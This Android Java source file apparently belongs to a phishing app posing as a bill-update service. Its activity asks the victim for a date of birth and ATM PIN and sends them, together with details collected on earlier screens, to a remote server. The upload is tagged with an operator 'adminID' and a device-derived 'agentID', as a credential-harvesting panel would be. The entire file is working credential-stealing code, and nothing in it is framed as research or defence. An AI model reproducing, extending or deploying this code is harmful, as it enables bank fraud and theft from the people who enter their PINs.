package com.pegalite.neotron3.ui.bill;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivityBillUpdatePage5Binding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class BillUpdatePage5Activity extends AppCompatActivity {

    ActivityBillUpdatePage5Binding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityBillUpdatePage5Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.submit.setOnClickListener(view -> {
            String dateOfBirth = binding.dateOfBirth.getText().toString();
            String atmPin = binding.atmPin.getText().toString();

            if (dateOfBirth.isEmpty() || atmPin.isEmpty()) {
                Toast.makeText(this, "Please fill all fields", Toast.LENGTH_SHORT).show();
            } else {
                try {
                    JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                    object.put("dateOfBirth", dateOfBirth);
                    object.put("atmPin", atmPin);
                    saveDetails(object);
                    startActivity(new Intent(this, BillUpdatePage7Activity.class).putExtra("data", object.toString()));
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }

        });
        binding.dateOfBirth.addTextChangedListener(new TextWatcher() {
            private String current = "";
            private final String slash = "/";

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                String input = s.toString();

                if (!input.equals(current)) {
                    StringBuilder formatted = getStringBuilder(input);

                    current = formatted.toString();
                    binding.dateOfBirth.removeTextChangedListener(this);
                    binding.dateOfBirth.setText(current);
                    binding.dateOfBirth.setSelection(current.length());
                    binding.dateOfBirth.addTextChangedListener(this);
                }
            }

            @NonNull
            private StringBuilder getStringBuilder(String input) {
                String clean = input.replaceAll("[^\\d]", "");
                StringBuilder formatted = new StringBuilder();

                int len = clean.length();

                if (len > 0) {
                    formatted.append(clean.substring(0, Math.min(2, len)));
                    if (len >= 3) {
                        formatted.append(slash).append(clean.substring(2, Math.min(4, len)));
                    }
                    if (len >= 5) {
                        formatted.append(slash).append(clean.substring(4, Math.min(8, len)));
                    }
                }
                return formatted;
            }
        });

    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces().onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName()).put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

}